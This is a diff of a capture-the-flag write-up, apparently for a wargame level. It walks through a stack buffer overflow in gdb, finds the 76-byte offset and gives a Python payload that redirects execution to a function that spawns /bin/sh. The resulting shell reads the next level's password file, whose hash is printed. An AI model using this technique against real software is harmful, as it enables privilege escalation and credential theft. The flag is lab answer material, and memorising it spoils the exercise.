@@ -56,9 +56,10 @@ End of assembler dump.
 - to do that we need 2 things: 
     1. know exactly the offset of the buffer (we know that 80 bytes has been allocated but not exactly the offset). 
     2. which payload to execute and how. sure we need to find a way to execute `cat /user/level2/home/.pass` as `level2`but how?
-- to get the offset 
-    1. we create a pattern of 80 characters (the same number of bytes allocated being 1 char = 1 byte) and save it i na file in the only place where we can save data: `python -c'print"a"*81' > /tmp/pattern`
-    2. we pass this pattern as argument of ./level1 using gdb: 
+
+## How to get the offset 
+- we create a pattern of 80 characters (the same number of bytes allocated being 1 char = 1 byte) and save it i na file in the only place where we can save data: `python -c'print"a"*81' > /tmp/pattern`
+- we pass this pattern as argument of ./level1 using gdb: 
     ``` 
     gdb ./level1
     run < /temp/pattern
@@ -70,8 +71,8 @@ End of assembler dump.
     Program received signal SIGSEGV, Segmentation fault.
     0x61616161 in ?? ()
     ```
-    - since 61 is the ASCII for the character "a" we can constate that the address contains actually 4 "a" characters, that means that 80 - 4 = the exact point where the buffer is overflowed = 76
-    - to confirm that we use the `info registers` gdb command:
+- since `61` is the ASCII for the character "a" we can constate that the address contains actually 4 "a" characters, that means that 80 - 4 = the exact point where the buffer is overflowed = 76
+- to confirm that we use the `info registers` gdb command:
     ```
     (gdb) info registers
     eax            0xbffff6e0	-1073744160
@@ -91,7 +92,7 @@ End of assembler dump.
     fs             0x0	0
     gs             0x33	51
     ```
-## Run
+## Which payload to execute
 - we inspect the run function
 ```
 (gdb) disas run
@@ -113,7 +114,7 @@ Dump of assembler code for function run:
    0x0804847f <+59>:	ret    
 End of assembler dump.
 ```
-- <+41>, <+46>, and <+53> are the most critical instructions within the run function. The fwrite function writes data to a file stream, and the subsequent system call indicates the execution of a shell command. But what shell command is being executed? To determine this, we inspect the argument passed to the system function:
+- <+41>, <+46>, and <+53> are the most critical instructions within the run function. The `fwrite` function writes data to a file stream, and the subsequent system call indicates the execution of a shell command. But what shell command is being executed? To determine this, we inspect the argument passed to the system function:
     ```
     (gdb) x/s 0x8048584
     0x8048584:	 "/bin/sh"
@@ -126,13 +127,14 @@ End of assembler dump.
 - we create a file containing 76 char + the address of run function reversing it (for little endian):
 `python -c 'print"a"*76+"\x44\x84\x04\x08"' > /tmp/exploit`
 - we pass the `exploit` file as argument to `./level1`and we get a response `Good... Wait what?`but after that a segfault.
-- we have to find a way to keep the stdin open after cat reads from the file, ensuring the program doesn't crash when system tries to read from it: `cat /tmp/exploit - | ./level`
+- we have to find a way to keep the stdin open after cat reads from the file, ensuring the program doesn't crash when system tries to read from it: `cat /tmp/exploit - | ./level1`
 ## Solution
 - this way the prompt is returned to us and we can try to cat the .pass of level2:
 ```
+`cat /tmp/exploit - | ./level1`
 Good... Wait what?
-whoami
+> whoami
 level2
-cat /home/user/level2/.pass
+> cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
